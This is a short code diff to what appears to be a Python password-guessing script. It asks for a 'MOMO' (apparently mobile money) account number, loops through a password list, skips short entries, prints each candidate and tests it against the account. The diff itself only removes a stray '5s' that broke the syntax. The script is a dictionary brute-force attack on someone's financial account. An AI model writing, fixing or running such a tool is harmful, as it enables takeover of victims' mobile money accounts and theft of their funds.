@@ -55,7 +55,7 @@ if __name__ == "__main__":
     email = input('ENER VALID MOMO NUMBER: ').strip()
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
-        if len(password) < MIN_PASSWORD_LENGTH: 5s
+        if len(password) < MIN_PASSWORD_LENGTH:
             continue
         print("LOADING ACCOUNT WITH 💵 [", index, "]: ", password)
         if is_this_a_password(email, index, password):
